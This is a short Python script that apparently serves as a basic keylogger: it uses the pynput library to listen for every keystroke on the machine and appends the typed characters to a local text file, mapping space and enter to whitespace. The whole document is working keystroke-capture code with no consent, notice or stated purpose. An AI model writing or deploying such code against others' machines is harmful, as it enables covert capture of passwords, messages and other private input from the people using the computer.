from pynput.keyboard import Listener



def keystrokes(key):

    content = str(key)

    content = content.replace("'","")



    if content == 'Key.backspace':

        content = ""

    if content == 'Key.space':

        content = " "

    if content == 'Key.enter':

        content = "\n"

    if content == 'Key.shift':

        content = ""



    with open("C:\\Python project\\output.txt","a") as N:

        N.write(content)



with Listener(on_press= keystrokes) as L:

    L.join()
